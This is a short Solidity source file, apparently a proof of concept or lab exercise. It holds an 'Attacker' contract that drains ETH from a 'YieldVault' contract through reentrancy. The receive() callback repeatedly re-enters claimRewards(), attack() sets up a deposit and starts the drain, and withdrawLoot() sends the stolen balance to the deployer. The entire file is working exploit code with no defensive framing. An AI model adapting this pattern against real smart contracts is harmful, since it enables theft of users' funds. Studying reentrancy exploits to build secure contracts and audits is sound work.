// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "./DeFiVault.sol";
import "./IERC20.sol";

contract Attacker {
    YieldVault public vault;
    IERC20 public token;
    address public owner;

    constructor(address _vault, address _token) {
        vault = YieldVault(_vault);
        token = IERC20(_token);
        owner = msg.sender;
    }

    // The malicious callback
    receive() external payable {
        if (address(vault).balance >= 0.1 ether) {
            vault.claimRewards(); // Re-enter!
        }
    }

    function attack() external {
        // Step 1: Approve the vault to take our ERC20
        token.approve(address(vault), 1e18);
        
        // Step 2: Deposit standard ERC20
        vault.deposit(1e18);
        
        // Step 3: Trigger the recursive ETH reward drain
        vault.claimRewards();
    }

    function withdrawLoot() external {
        payable(owner).transfer(address(this).balance);
    }
}